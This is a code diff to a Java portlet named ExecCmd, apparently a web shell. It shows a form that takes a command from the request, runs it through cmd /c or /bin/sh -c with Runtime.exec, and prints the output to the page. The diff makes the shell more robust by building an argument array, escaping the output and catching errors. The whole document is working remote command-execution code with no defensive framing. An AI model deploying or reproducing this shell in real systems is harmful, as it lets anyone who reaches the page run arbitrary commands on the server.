@@ -22,43 +22,48 @@ public class ExecCmd extends GenericPortlet {
 	public void doView(RenderRequest request, RenderResponse response)
 	throws PortletException, IOException
 	{
-
-        String OS;
-        String prefix;
-
-        OS = System.getProperty("os.name");
-        if (OS.startsWith("Windows")){
-            prefix = "cmd /c ";
-        }
-        else{
-            prefix = "/bin/sh -c ";
-        }
-
 		response.setContentType("text/html");
 		PrintWriter writer = response.getWriter();
-		writer.println("<p>Execute command</p>");
+
+		String osname=System.getProperty("os.name");
+		String[] cmdshell = new String[3];
+		if (osname.indexOf("Win") >= 0) {
+			cmdshell[0]="cmd";
+			cmdshell[1]="/c";
+		} else {
+			cmdshell[0]="/bin/sh";
+			cmdshell[1]="-c";
+		}
+
+		writer.println("<p>Execute command on "+osname+"</p>");
 		writer.println("<p><form action=\""+response.createActionURL()+"\" method=\"POST\">");
 		writer.println("<input name=\""+response.getNamespace()+"cmd\" />");
 		writer.println("<input name=\"submit\" type=\"submit\" value=\"Execute\" />");
 		writer.println("</form></p>");
 
-		String cmd=request.getParameter(response.getNamespace()+"cmd");
+		cmdshell[2]=request.getParameter(response.getNamespace()+"cmd");
 
-		if (cmd == null) {
-			writer.println("<p>No command to execute</p>");
-		} else {
-			writer.println("<p>Executing: "+prefix+cmd+"</p>");
-			writer.println("<hr><pre>");
-			Process p = Runtime.getRuntime().exec(prefix+cmd);
-			OutputStream os = p.getOutputStream();
-			InputStream in = p.getInputStream();
-			DataInputStream dis = new DataInputStream(in);
-			String disr = dis.readLine();
-			while ( disr != null ) {
-				writer.println(disr);
-				disr = dis.readLine();
+		try {
+			if (cmdshell[2] == null) {
+				writer.println("<p>No command to execute</p>");
+			} else {
+				writer.println("<p>Executing: "+cmdshell[2]+"</p>");
+				writer.println("<hr><pre>");
+				Process p = Runtime.getRuntime().exec(cmdshell);
+				OutputStream os = p.getOutputStream();
+				InputStream in = p.getInputStream();
+				DataInputStream dis = new DataInputStream(in);
+				String disr = dis.readLine();
+				while ( disr != null ) {
+					disr = disr.replaceAll("[>]","&gt;").replaceAll("[<]", "&lt;");
+					writer.println(disr);
+					disr = dis.readLine();
+				}
+				writer.println("</pre><hr>");
 			}
-			writer.println("</pre><hr>");
+		} 
+		catch(Exception e) {
+			writer.println("<p><pre>Exception: "+ e.toString() +"</pre></p>");
 		}
 
 	}
